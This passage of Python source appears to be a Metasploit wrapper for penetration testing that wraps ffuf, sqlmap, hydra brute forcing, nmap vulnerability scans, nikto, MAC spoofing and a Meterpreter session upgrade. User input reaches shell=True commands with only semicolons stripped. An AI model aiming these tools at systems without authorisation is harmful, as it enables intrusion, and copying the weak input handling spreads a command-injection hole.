                        print(f"\033[92m[+] completed\033[0m")
                        limitloop = True
                        return
                    else:
                        print("[-] This module requires the target to be a URL")
                        return

                if url_input:
                    url = url_input
                    if validators.url(url):
                        domain = url
                        hostname = urllib.parse.urlsplit(domain).hostname
                        limitloop = True
                        break
                    else:
                        print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")
                        return
                else:
                    url = input_with_backspace("\nURL to check (Press enter to exit)> ").strip()
                    if not url:
                        return
                    if validators.url(url):
                        domain = url
                        hostname = urllib.parse.urlsplit(domain).hostname
                        break
                    else:
                        print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")

        while True:
            custom_wordlist = input_with_backspace("Path/name of the wordlist (Press enter for default): ").strip()
            if not custom_wordlist:
                custom_wordlist = f"{ffuf_default_wordlist}" # Default wordlist value
            try:
                with open(custom_wordlist):
                    break  # Exit the loop if the file is found
            except FileNotFoundError:
                print(f"[-] {custom_wordlist} not found. Please try again.")

        while True:
            threads_input = input_with_backspace("How many threads? -t (Press enter for default): ").strip()
            if not threads_input:
                threads = "50" # Default value if Enter is pressed
                break
            try:
                threads = int(threads_input)
                if threads <= 0:
                    print("[-] Threads must be a positive integer greater than zero.")
                else:
                    break
            except ValueError:
                print("[-] Invalid thread count. Please enter a valid integer greater than zero.")

        while True:
            filterwords_input = input_with_backspace("Filter by number of words? -fw (Press enter for N/A): ").strip()
            if not filterwords_input:
                filterwords = "" # Default value if Enter is pressed
                break
            else:
                filterwords_list = re.findall(r'\d+', filterwords_input)
                filterwords = ",".join(filterwords_list)
                if not filterwords:
                    print("[-] -fw must be a positive integer or comma-separated list of positive integers.")
                else:
                    break

        while True:
            additional_options = input_with_backspace("Options/Parameters (-h for list. Press enter for default): ").strip()
            if not additional_options:
                additional_options = "-c -mc all -fc 404,400  -D -e zip,aspx,vbhtml -recursion -sf -ac"
                break
            elif additional_options.lower() == "-h":
                command = "ffuf"
                subprocess.call(command, shell=True)
                continue
            else:
                break

        if not filterwords:
            command = f"ffuf -u {domain}/FUZZ -w {custom_wordlist} {additional_options} -t {threads}"
        else:
            command = f"ffuf -u {domain}/FUZZ -w {custom_wordlist} {additional_options} -t {threads} -fw {filterwords}"

        print(f"\n{command}\n")
        subprocess.call(command, shell=True)
        
    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...\n")
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] An error occurred: {e}{reset_color}")

def sqli():
    try:
        while True:
            text = input_with_backspace("\n Enter sqlmap command, -h, -hh, or --wizard (Press enter to exit)> ")
            if not text:
                break
            elif text.lower() == "-h":
                command = "sqlmap -h"
                subprocess.call(command, shell=True)
                continue
            elif text.lower() == "-hh":
                command = "sqlmap -hh"
                subprocess.call(command, shell=True)
                continue
            elif text.lower() == "--wizard":
                command = "sqlmap --wizard"
                subprocess.call(command, shell=True)
                continue
            else:
                # If the command doesn't start with "sqlmap", prepend it to the command
                if not text.lower().strip().startswith("sqlmap"):
                    text = "sqlmap " + text
                print("\n" + text + "\n")
                subprocess.call(text, shell=True)

    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...\n")
        print("")
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] An error occurred: {e}{reset_color}")

def login():
    try:
        print("\n**USE BASH IF YOU WANT TO ENTER MORE COMPLEX HYRA COMMANDS**")
        while True:
            restore = input_with_backspace("\nRestore previous session? y/n (Press Enter to exit) > ")
            if not restore:
                break
            if restore.lower() == "y":
                command = f"hydra -R"
            elif restore.lower() == "n":
                endpoint = input_with_backspace("Enter the name of the endpoint (Press enter to exit) (Ex ftp://10.0.0.1)> ")
                if not endpoint:
                    return
                    
                while True:
                    users_file_path = input_with_backspace("Path/name of the users wordlist (Press Enter to exit)> ")
                    if not users_file_path:
                        return  # Exit the loop if the user presses enter (no custom wordlist)
                    try:
                        with open(users_file_path):
                            break  # Exit the loop if the file is found
                    except FileNotFoundError:
                        print(f"[-] {users_file_path} not found. Please try again.")

                while True:
                    passwords_file_path = input_with_backspace("Path/name of the passwords wordlist (Press Enter to exit)> ")
                    if not passwords_file_path:
                        return  # Exit the loop if the user presses enter (no custom wordlist)
                    try:
                        with open(passwords_file_path):
                            break  # Exit the loop if the file is found
                    except FileNotFoundError:
                        print(f"[-] {passwords_file_path} not found. Please try again.")

                command = f"hydra -L {users_file_path} -P {passwords_file_path} {endpoint}"
            else:
                print("[-] Invalid input. Please enter either y or n.")
                continue
            
            print()
            print(command)
            print()
            try:
                subprocess.call(shlex.split(command))
            except subprocess.CalledProcessError as e:
                print(f"[-] Error running command: {e}")
    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...\n")
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] An error occurred: {e}{reset_color}")
        
def scan(url_input):
    global globaltarget, globaltargetenabled, target_is_url, target_is_ip
    try:
        if globaltargetenabled:
            if target_is_url:
                ip = globaltarget
                hostname = urllib.parse.urlsplit(ip).hostname
                command = f"nmap -p- -T3 --min-rate=750 -sC -sV {hostname}"
                print(f"\n{command}\n")
                subprocess.call(command, shell=True)
                return
            elif target_is_ip:
                ip = globaltarget
                command = f"nmap -p- -T3 --min-rate=750 -sC -sV {ip}"
                print(f"\n{command}\n")
                subprocess.call(command, shell=True)
                return

        while True:
            if url_input:
                ip = url_input
                url_input = None  # Reset url_input after first use
            else:
                ip = input_with_backspace("\nIP address or URL to scan (Press enter to exit)> ").strip()
                if not ip:
                    return  # Exit the function if the user presses Enter without inputting anything

            if validators.url(ip):
                hostname = urllib.parse.urlsplit(ip).hostname
                if hostname is None:
                    print("[-] Invalid URL entered. Please try again.")
                    continue
                scan_target = hostname
            elif validate_ip_address(ip):
                scan_target = ip
            else:
                print("[-] Invalid IP or URL entered. Please try again.")
                continue

            while True:
                additional_options = input_with_backspace(f"Options/Parameters (-h for list. Press enter for default): ").strip()
                if not additional_options:
                    command = f"nmap -p- -T3 --min-rate=750 -sC -sV {scan_target}"
                elif additional_options.lower() == "-h":
                    command = "nmap -h"
                else:
                    command = f"nmap {additional_options} {scan_target}"

                print(f"\n{command}\n")
                try:
                    subprocess.call(command, shell=True)
                except subprocess.CalledProcessError as e:
                    print(f"[-] Error running command: {e}")

                # Break the inner loop only if valid options were provided
                if additional_options.lower() != "-h":
                    break

    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...\n")
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] An error occurred: {e}{reset_color}")

def ping(url_input):
    global globaltarget, globaltargetenabled, target_is_url, target_is_ip
    try:
        if globaltargetenabled:
            if target_is_url:
                ip = globaltarget
                hostname = urllib.parse.urlsplit(ip).hostname
                command = f"nmap -sn {hostname}"
                print(f"\n{command}\n")
                subprocess.call(command, shell=True)
                return
            elif target_is_ip:
                ip = globaltarget
                command = f"nmap -sn {ip}"
                print(f"\n{command}\n")
                subprocess.call(command, shell=True)
                return

        while True:
            if url_input:
                ip = url_input
                url_input = None  # Reset url_input after first use
            else:
                ip = input_with_backspace("\nIP address or URL to ping (Press enter to exit)> ").strip()
                if not ip:
                    return  # Exit the function if the user presses Enter without inputting anything

            if validators.url(ip):
                hostname = urllib.parse.urlsplit(ip).hostname
                if hostname is None:
                    print("[-] Invalid URL entered. Please try again.")
                    continue
                command = f"nmap -sn {hostname}"
            elif validate_ip_address(ip):
                command = f"nmap -sn {ip}"
            else:
                print("[-] Invalid IP or URL entered. Please try again.")
                continue

            print(f"\n{command}\n")
            try:
                subprocess.call(shlex.split(command))
            except subprocess.CalledProcessError as e:
                print(f"[-] Error running command: {e}")

    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...\n")
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] An error occurred: {e}{reset_color}")

def sbust(url_input):
    global globaltarget, globaltargetenabled, target_is_url

    try:
        # Check if global target is enabled and is a URL
        if globaltargetenabled:
            if target_is_url:
                try:
                    ip = globaltarget
                    hostname = urllib.parse.urlsplit(ip).hostname
                    command = f"subfinder -t 16 -d {hostname}"
                    print(f"\n{command}\n")
                    subprocess.call(command, shell=True)
                except KeyboardInterrupt:
                    print("\nKeyboard interrupt detected. Exiting...\n")
                except Exception as e:
                    print(f"Error: {e}")
            else:
                print("\n[-] This module requires the target to be a URL")
            return

        # Loop for user input if global target is not used
        while True:
            if url_input:
                ip = url_input
                url_input = None  # Reset url_input after first use
            else:
                ip = input_with_backspace("\nURL to scan (Press enter to exit)> ").strip()
                if not ip:  # Check if the input is empty
                    return  # Exit the function if the input is empty

            if validators.url(ip):
                hostname = urllib.parse.urlsplit(ip).hostname
                command = f"subfinder -t 16 -d {hostname}"
                print(f"\n{command}\n")
                try:
                    subprocess.call(command, shell=True)
                except subprocess.CalledProcessError as e:
                    print(f"[-] Error running command: {e}")
            else:
                print("[-] Invalid URL entered. Please try again.")

    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...\n")
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] An error occurred: {e}{reset_color}")
        
def vulnwebnikto(url_input):
    global globaltarget, globaltargetenabled, target_is_url, target_is_ip
    try:
        if globaltargetenabled:
            if target_is_url:
                ip = globaltarget
                hostname = urllib.parse.urlsplit(ip).hostname
                command = f"nikto -h {hostname} -Display 4P -C all"
                print(f"\n{command}\n")
                subprocess.call(command, shell=True)
                return
            elif target_is_ip:
                ip = globaltarget
                command = f"nikto -h {ip} -Display 4P -C all"
                print(f"\n{command}\n")
                subprocess.call(command, shell=True)
                return

        while True:
            if url_input:
                ip = url_input
                url_input = None  # Reset url_input after first use
            else:
                ip = input_with_backspace("\nIP address or URL to scan (Press enter to exit)> ").strip()
                if not ip:
                    return  # Exit the function if the user presses Enter without inputting anything

            if validators.url(ip):
                hostname = urllib.parse.urlsplit(ip).hostname
                if hostname is None:
                    print("[-] Invalid URL entered. Please try again.")
                    continue

                while True:
                    additional_options = input_with_backspace(f"Options/Parameters (-h for list. Press enter for default): ").strip()
                    if not additional_options:
                        command = f"nikto -h {hostname} -Display 4P -C all"
                    elif additional_options.lower() == "-h":
                        command = "nikto -Help"
                    else:
                        command = f"nikto {additional_options} {hostname}"

                    print(f"\n{command}\n")
                    try:
                        subprocess.call(command, shell=True)
                    except subprocess.CalledProcessError as e:
                        print(f"[-] Error running command: {e}")

                    # Break the inner loop only if valid options were provided
                    if additional_options.lower() != "-h":
                        break

            elif validate_ip_address(ip):
                while True:
                    additional_options = input_with_backspace(f"Options/Parameters (-h for list. Press enter for default): ").strip()
                    if not additional_options:
                        command = f"nikto -h {ip} -Display 4P -C all"
                    elif additional_options.lower() == "-h":
                        command = "nikto -Help"
                    else:
                        command = f"nikto {additional_options} {ip}"

                    print(f"\n{command}\n")
                    try:
                        subprocess.call(command, shell=True)
                    except subprocess.CalledProcessError as e:
                        print(f"[-] Error running command: {e}")

                    # Break the inner loop only if valid options were provided
                    if additional_options.lower() != "-h":
                        break

            else:
                print("[-] Invalid IP or URL entered. Please try again.")
                continue

    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...\n")
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] An error occurred: {e}{reset_color}")

def vulnport(url_input):
    global globaltarget, globaltargetenabled, target_is_url, target_is_ip

    try:
        if globaltargetenabled:
            if target_is_url:
                ip = globaltarget
                hostname = urllib.parse.urlsplit(ip).hostname
                command = f"nmap -p- -sV -T3 --min-rate=750 --script vuln {hostname}"
                print(f"\n{command}\n")
                subprocess.call(command, shell=True)
                return
            elif target_is_ip:
                ip = globaltarget
                command = f"nmap -p- -sV -T3 --min-rate=750 --script vuln {ip}"
                print(f"\n{command}\n")
                subprocess.call(command, shell=True)
                return

        while True:
            if url_input:
                ip = url_input
                url_input = None  # Reset url_input after first use
            else:
                ip = input_with_backspace("\nIP address or URL to scan (Press enter to exit)> ").strip()
                if not ip:
                    return  # Exit the function if the user presses Enter without inputting anything

            if validators.url(ip):
                hostname = urllib.parse.urlsplit(ip).hostname
                if hostname is None:
                    print("[-] Invalid URL entered. Please try again.")
                    continue
                command = f"nmap -p- -sV -T3 --min-rate=750 --script vuln {hostname}"
            elif validate_ip_address(ip):
                command = f"nmap -p- -sV -T3 --min-rate=750 --script vuln {ip}"
            else:
                print("[-] Invalid IP or URL entered. Please try again.")
                continue

            print(f"\n{command}\n")
            try:
                subprocess.call(shlex.split(command))
            except subprocess.CalledProcessError as e:
                print(f"[-] Error running command: {e}")

    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...\n")
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] An error occurred: {e}{reset_color}")

def dbust(url_input):
    global globaltarget, globaltargetenabled, target_is_url, dirb_default_wordlist
    print("**FUZZ ENUMERATES MUCH FASTER**")

    try:
        if globaltargetenabled:
            if target_is_url:
                ip = globaltarget
                command = f"dirb {ip} -r {dirb_default_wordlist}"
                print(f"\n{command}\n")
                try:
                    subprocess.call(shlex.split(command))
                    return
                except subprocess.CalledProcessError as e:
                    print(f"[-] Error running command: {e}")
                    return
            print("\n[-] this module requires the target to be a URL")
            return

        while True:  # Infinite loop to keep asking for URLs until the user exits
            if url_input:
                url = url_input
                url_input = None  # Reset url_input after first use
            else:
                url = input_with_backspace("\nURL to scan (Press enter to exit)> ").strip()
                if not url:
                    return  # If the user presses Enter without entering a URL, exit the loop

            if validators.url(url):
                break  # Exit the loop if a valid URL is provided
            else:
                print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")

        while True:
            custom_wordlist = input_with_backspace("Custom wordlist (Press enter for default): ").strip()
            if not custom_wordlist:
                custom_wordlist = dirb_default_wordlist  # Default wordlist value
                break  # Exit the loop if the user presses enter (default wordlist)
            try:
                with open(custom_wordlist):
                    break  # Exit the loop if the file is found
            except FileNotFoundError:
                print(f"[-] {custom_wordlist} not found. Please try again.")

        while True:
            additional_options = input_with_backspace("Additional options (-h for list. Press enter for default): ").strip()
            if additional_options.lower() == "-h":
                command = "dirb"
                print()
                subprocess.call(command, shell=True)
            else:
                command = f"dirb {url} {custom_wordlist} {additional_options}"
                print(f"\n{command}\n")
                try:
                    subprocess.call(shlex.split(command))
                except subprocess.CalledProcessError as e:
                    print(f"[-] Error running command: {e}")
            if additional_options.lower() != "-h":
                break

    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...\n")
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] An error occurred: {e}{reset_color}")

def spider(url_input):
    while True:  # Infinite loop to keep asking for URLs until the user exits
        try:
            while True:
                target_url = input_with_backspace("\nURL to scan (Press enter to exit)> ")
                if not target_url:
                    return  # If the user presses Enter without entering a URL, exit the loop
                if not validators.url(target_url):
                    print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")
                else:
                    break

            while True:
                try:
                    depth_input = input_with_backspace("Crawl depth (Press enter for default): ")
                    if not depth_input:
                        depth = 5  # Default depth value
                        break
                    else:
                        depth = int(depth_input)
                        if depth <= 0:
                            print("[-] Depth must be a positive integer greater than zero.")
                        else:
                            break
                except ValueError:
                    print("[-] Invalid depth. Please enter a valid integer greater than zero.")

            filename = None
            save_output = input_with_backspace("save output with filename (Press enter for N/A): ")
            if save_output:
                filename = save_output.strip()

            target_links = []

            def extract_links_from(url):
                try:
                    response = requests.get(url, allow_redirects=True)
                except requests.exceptions.RequestException as e:
                    print("[-] Failed to retrieve links from", url, ":", e)
                    return []

                # Extract all links from the page
                return re.findall('(?:href|src)="(.*?)"', response.content.decode(errors="ignore"))

            def crawl(url, depth, file):
                base_url = urllib.parse.urljoin(url, "/")
                if url in target_links:
                    return
                target_links.append(url)
                print(url)
                if file:
                    file.write(url + "\n")
                if depth > 1:
                    href_links = extract_links_from(url)
                    for link in href_links:
                        link = urllib.parse.urljoin(url, link)
                        if "#" in link:
                            link = link.split("#")[0]
                        if target_url in link and link not in target_links and base_url in link:
                            crawl(link, depth=depth-1, file=file)

            if filename:
                print("[+] Crawling", target_url, "up to depth", depth)
                with open(filename, "w") as file:
                    file.write("Crawling " + target_url + " up to depth " + str(depth) + "\n")
                    crawl(target_url, depth=depth, file=file)
                    file.write("Crawling complete!")
                print("[+] Crawling complete!")
            else:
                print("\n[+] Crawling", target_url, "up to depth", depth)
                crawl(target_url, depth=depth, file=None)
                print("\n[+] Crawling complete!")

        except KeyboardInterrupt:
            print("\nKeyboard interrupt detected. Exiting...\n")
            return
        except Exception as e:
            color = "\033[93m"
            reset_color = "\033[0m"
            print(f"{color}[-] An error occurred: {e}{reset_color}")

def default_spider(domain):
    output_file = "/home/kali/VforMSF/temp/spider_output.txt"
    depth = 5  # Default crawl depth
    target_links = []
    print("\n[+] Crawling", domain, "up to depth", depth)
    def extract_links_from(url):
        try:
            response = requests.get(url, allow_redirects=True)
        except requests.exceptions.RequestException as e:
            print(f"[-] Failed to retrieve links from {url}: {e}")
            return []

        # Extract all links from the page
        return re.findall('(?:href|src)="(.*?)"', response.content.decode(errors="ignore"))

    def crawl(url, depth, file):
        base_url = urllib.parse.urljoin(url, "/")
        if url in target_links:
            return
        target_links.append(url)
        print(f"{url}")
        file.write(url + "\n")
        if depth > 1:
            href_links = extract_links_from(url)
            for link in href_links:
                link = urllib.parse.urljoin(url, link)
                if "#" in link:
                    link = link.split("#")[0]
                if domain in link and link not in target_links and base_url in link:
                    crawl(link, depth=depth-1, file=file)

    with open(output_file, "a") as file:
        file.write(f"[+] Crawling {domain} up to depth {depth}\n")
        crawl(domain, depth, file)
        file.write("[+] Crawling complete!\n")
    print("\n[+] Crawling complete! Output saved to spider_output.txt")

def input_with_backspace(prompt=''):
    readline.set_startup_hook(lambda: readline.insert_text(''))
    try:
        user_input = input(prompt)
        # Removing semicolon character from the input
        user_input = user_input.replace(';', '')
        return user_input
    finally:
        readline.set_startup_hook()

# Validating user input to ensure the IP addresses are in the correct format and are valid IP addresses.
def validate_ip_address(ip):
    if '/' in ip:
        ip, mask = ip.split('/')
        if not validate_ip_address(ip):
            return False
        if not re.match(r"\d{1,2}$", mask):
            return False
    else:
        if not re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip):
            return False
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False
    return True

def is_alive(ip):
    try:
        subprocess.check_output(["ping", "-c", "1", "-W", "1", ip])
        return True
    except subprocess.CalledProcessError:
        return False

def arp_scan(ip):
    try:
        scapy.arping(ip)
    except Exception as e:
        raise e
        
def arp_function():
    print("**must be root**\n")
    while True:  # Infinite loop to keep asking for IP addresses or networks until the user exits
        try:
            ips = input_with_backspace("IP addresses or network to scan (Press enter to exit)> ")
            if not ips:
                return  # If the user presses Enter without entering an IP address, exit the loop

            if validate_ip_address(ips):
                try:
                    arp_scan(ips)
                    print()
                except Exception as e:
                    print(f"[-] Error occurred during scan: {e}")
                    print()
            else:
                print("[-] Invalid IP address or network entered. Please try again.")
                continue

        except KeyboardInterrupt:
            print("\nKeyboard interrupt detected. Exiting...\n")
        except Exception as e:
            color = "\033[93m"
            reset_color = "\033[0m"
            print(f"{color}[-] An error occurred: {e}{reset_color}")
    
def change_mac(adapter, address):
    subprocess.call(["ifconfig", adapter, "down"])
    subprocess.call(["ifconfig", adapter, "hw", "ether", address])
    subprocess.call(["ifconfig", adapter, "up"])
    print("[+] Changing MAC address for " + adapter + " to " + address)

def get_current_mac(adapter):
    try:
        ifconfig_result = subprocess.check_output(["ifconfig", adapter])
        mac_address_search_result = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_result))
        if mac_address_search_result:
            return mac_address_search_result.group(0)
    except subprocess.CalledProcessError:
        pass
    return None

def mac_change():
    while True:  # Infinite loop to keep asking for adapters to change until the user exits
        try:
            adapter, address = get_input()
            if not adapter:
                return  # If the user presses Enter without entering an adapter, exit the loop

            current_mac = get_current_mac(adapter)
            if current_mac is None:
                print("[-] Could not read MAC Address for adapter " + adapter + " (adapter does not exist)")
                continue

            change_mac(adapter, address)
            current_mac = get_current_mac(adapter)
            if current_mac == address:
                print("[+] MAC address was successfully changed to " + current_mac + "\n")
            else:
                print("[-] MAC address did not get changed.\n")

        except KeyboardInterrupt:
            print("\nKeyboard interrupt detected. Exiting...\n")
            return

def get_input():
    print("**must be root**\n")
    try:
        while True:
            adapter = input_with_backspace("Enter the adapter name you want to change (Press enter to exit)> ")
            if not adapter:
                break

            # Check if the entered adapter name exists on the system (Linux/macOS)
            if not is_valid_adapter(adapter):
                print(f"[-] Adapter '{adapter}' not found. Please enter a valid adapter name.")
                continue

            address = input_with_backspace("Enter the new MAC address (Press enter for random): ")
            if not address:
                address = "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}".format(
                    random.randint(10, 48) * 2,
                    random.randint(10, 99),
                    random.randint(10, 99),
                    random.randint(10, 99),
                    random.randint(10, 99),
                    random.randint(10, 99)
                )
                print("[+] Generated random MAC address: " + address)

            while not re.match(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", address):
                print("[-] MAC addresses cannot have an odd first digit and must follow the XX:XX:XX:XX:XX:XX format.")
                address = input_with_backspace("Enter the new MAC address (Press enter for random): ")
                if not address:
                    address = "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}".format(
                        random.randint(10, 48) * 2,
                        random.randint(10, 99),
                        random.randint(10, 99),
                        random.randint(10, 99),
                        random.randint(10, 99),
                        random.randint(10, 99)
                    )
                    print("[+] Generated random MAC address: " + address)
            return adapter, address

    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Exiting...\n")
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] An error occurred: {e}{reset_color}")

def is_valid_adapter(adapter_name):
    # Execute the appropriate command to check if the adapter exists on Linux
    try:
        subprocess.check_output(f"ifconfig -a {adapter_name}", shell=True, text=True)
        return True
    except subprocess.CalledProcessError:
        return False

def start_msf():
    try:
        # Start the postgresql service
        print("[+] Starting postgresql service...")
        subprocess.run(["sudo", "systemctl", "start", "postgresql.service"], check=True)
        
        # Initialize the Metasploit Framework database
        print("[+] Initializing Metasploit Framework database (msfdb)...")
        subprocess.run(["sudo", "msfdb", "init"], check=True)
        
    except subprocess.CalledProcessError as e:
        print(f"[-] An error occurred while starting msfconsole.\n")
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] {e}{reset_color}")
    except Exception as e:
        print(f"[-] An error occurred while starting msfconsole.\n")
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] {e}{reset_color}")
        
def strip_ansi_sequences(text):
    ansi_escape_pattern = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
    return ansi_escape_pattern.sub('', text)

def checkendpoints_main(url_input):
    global globaltarget, globaltargetenabled, limitloop
    print(f"*Checks for potentially vulnerable endpoints*")

    while True:  # Infinite loop to keep asking for URLs until the user exits
        if globaltargetenabled:
            if not limitloop:
                if target_is_url:
                    url = globaltarget
                    domain = globaltarget
                    hostname = urllib.parse.urlsplit(domain).hostname
                    limitloop = True
                    break
                print("")
                print("[-] this module requires the target to be a URL")
                return
            color = "\033[92m"
            reset_color = "\033[0m"
            print(f"{color}[+] completed{reset_color}")
            limitloop = False
            return
        else:
            if url_input:
                url = url_input
                url_input = None  # Reset url_input after first use
            else:
                url = input_with_backspace("\nURL to check (Press enter to exit)> ").strip()
                if not url:
                    return  # If the user presses Enter without entering a URL, exit the loop

            if validators.url(url):
                domain = url
                hostname = urllib.parse.urlsplit(domain).hostname
                break  # Exit the loop if a valid URL is provided
            else:
                print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")

    def run_check(description, filename):
        try:
            print(f"\n[+] {description}")
            check_endpoints(domain, filename)
            color = "\033[92m"
            reset_color = "\033[0m"
            print(f"{color}[+] completed{reset_color}")
        except KeyboardInterrupt:
            print("[-] KeyboardInterrupt detected. Moving on...")
            print(" ")
        except Exception as e:
            color = "\033[93m"
            reset_color = "\033[0m"
            print(f"{color}[-] An error occurred: {e}{reset_color}")

    # List of descriptions and files to check
    checks = [
        ("Checking SQL Endpoints...\n", sql_endpoints_file),
        ("Checking LFI Endpoints...\n", lfi_endpoints_file),
        ("Checking Deserialization Endpoints...\n", deserialization_endpoints_file),
        ("Checking File Upload Endpoints...\n", upload_endpoints_file),
        ("Checking Misc Interesting Endpoints...\n", misc_vuln_endpoints),
        ("...More Misc Endpoints...\n", misc_vuln_endpoints_2),
        #("Checking Interesting Endpoints with Known Paths...\n", endpoints_with_paths),
    ]

    # Use ThreadPoolExecutor to manage threads
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(run_check, description, filename) for description, filename in checks]
    
        # Wait for all threads to complete
        for future in futures:
            future.result()

def checkports_main(url_input):
    global globaltarget, globaltargetenabled, limitloop
    print(f"*Checks for open ports (common)*")

    while True:
        while True:
            if not limitloop:
                if globaltargetenabled:
                    if target_is_url:
                        url = globaltarget
                        domain = globaltarget
                        hostname = urllib.parse.urlsplit(domain).hostname
                        limitloop = True
                        break
                    print("")
                    print("[-] this module requires the target to be a URL")
                    return
                if url_input:
                    url = url_input
                    if validators.url(url):
                        domain = url
                        hostname = urllib.parse.urlsplit(domain).hostname
                        limitloop = True
                        break  # Exit the loop if a valid URL is provided
                    print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")
                    return
                else:
                    url = input_with_backspace("\nURL to check (Press enter to exit)> ")
                if not url:
                    return  # If the user presses Enter without entering a URL, exit the loop
                if validators.url(url):
                    domain = url
                    hostname = urllib.parse.urlsplit(domain).hostname
                    break  # Exit the loop if a valid URL is provided
                print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")
            print("")
            color = "\033[92m"
            reset_color = "\033[0m"
            print(f"{color}[+] completed{reset_color}")
            limitloop = False
            return

        try:
            print(" ")
            print("[+] Checking Common Ports...")
            open_ports, closed_ports = check_smb_ports(domain)
            color = "\033[92m"
            reset_color = "\033[0m"
            if open_ports:
                for port, description in open_ports:
                    print(f"{color}[+] Port {port} ({description}) is OPEN{reset_color}")
        except KeyboardInterrupt:
            print("[-] KeyboardInterrupt detected. Moving on...")
            print(" ")
        except Exception as e:
            color = "\033[93m"
            reset_color = "\033[0m"
            print(f"{color}[-] An error occurred: {e}{reset_color}")
        
def main():
    # Set up initial pseudoterminal and msfconsole process
    master, slave = pty.openpty()
    pid = os.fork()

    if pid == 0:  # Child process
        os.close(master)
        os.dup2(slave, 0)
        os.dup2(slave, 1)
        os.dup2(slave, 2)

        # Execute the msfconsole process
        os.execlp("msfconsole", "msfconsole", "-q")  # Start msfconsole quietly
    else:  # Parent process
        os.close(slave)
        # Initialize variables
        first_launch = True
        defaultset = False
        inmodule = False
        modulepattern = r'\b(exploit|auxiliary|post|payload|encoder|nop|evasion)\((.*?)\)'
        ligoloup = False
    with open("command_log.txt", "a") as log_file:
        try:
            while True:
                # Wait for data to become available on the master end of the PTY or stdin
                rlist, _, _ = select.select([sys.stdin, master], [], [])
                for r in rlist:
                    if r == master:
                        output = os.read(master, 1024).decode()
                        sys.stdout.write(output)
                        sys.stdout.flush()
                        output = strip_ansi_sequences(output)

                        # Check if the output indicates that msfconsole is ready
                        if first_launch:
                            load_metasploit_params()
                            color = "\033[92m"
                            reset_color = "\033[0m"
                            print(f"{color}[+] Successfully loaded VforMSF extensions{reset_color}")
                            first_launch = False

                        if re.search(modulepattern, output):
                            inmodule = True
                        else:
                            inmodule = False

                    elif r == sys.stdin:
                        user_input = sys.stdin.readline()
                        command_log = user_input.strip()
                        if command_log:
                            log_file.write(command_log + "\n")
                            log_file.flush()

                        if globaltarget:
                            limitloop = False

                        if user_input.lower().strip() == "exit":
                            if ligoloup:
                               subprocess.call(['sudo ip link delete ligolo'])
                            os.write(master, b"exit\n")
                            sys.exit()

                        elif user_input.lower().startswith("use "):
                            os.write(master, user_input.encode())
                            os.write(master, f"show options\n".encode())
                               
                        elif user_input.lower().startswith("set config"):
                           match = re.search(modulepattern, output)
                           if match:
                               module_name = match.group(2)
                               os.write(master, f"back\n".encode())
                               send_metasploit_commands(master)
                               os.write(master, f"use {module_name}\n".encode())
                               defaultset = True
                           else:
                               send_metasploit_commands(master)
                               defaultset = True

                        elif user_input.lower().startswith("update config"):
                            try:
                                update_metasploit_params()
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        elif user_input.lower().startswith("show config"):
                            try:
                                print_current_defaults()
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        elif user_input.lower().startswith("load config"):
                            try:
                                load_metasploit_params()
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        elif user_input.lower().startswith("save config"):
                            try:
                                save_metasploit_params()
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        elif user_input.lower().startswith("upgrade"):
                            session = int(input("session: "))
                            os.write(master, f"use post/multi/manage/shell_to_meterpreter\n".encode())
                            os.write(master, f"set session {session}\n".encode())
                            os.write(master, f"exploit\n".encode())

                        elif user_input.lower().startswith("listen"):
                            parts = user_input.split()
